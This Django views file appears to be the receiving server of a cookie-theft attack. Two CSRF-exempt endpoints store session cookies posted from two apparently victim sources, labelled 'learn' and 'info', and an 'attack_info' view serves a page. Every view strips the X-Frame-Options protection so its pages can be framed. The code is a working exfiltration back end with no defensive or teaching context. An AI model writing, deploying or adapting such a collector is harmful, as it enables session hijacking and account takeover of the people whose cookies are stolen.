from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from cookies_storage.models import Cookies_storage

@csrf_exempt
def get_cookies_from_learn(request):
    if request.method == 'POST':
        print(request.POST)
        cookie = Cookies_storage()
        cookie.cookie = request.POST['c']
        cookie.type = 0
        cookie.save()
        response = JsonResponse({"return_code": 0})
        response["X-Frame-Options"] = ""
        return response

@csrf_exempt
def attack_info_view(request):
    response = render(request, 'index.html')
    print(response)
    response["X-Frame-Options"] = ""
    return response

@csrf_exempt
def get_cookies_from_info(request):
    if request.method == 'POST':
        print(request.POST)
        cookie = Cookies_storage()
        cookie.cookie = request.POST['c']
        cookie.type = 1
        cookie.save()
        response = JsonResponse({"return_code": 0})
        response["X-Frame-Options"] = ""
        return response


# Create your views here.
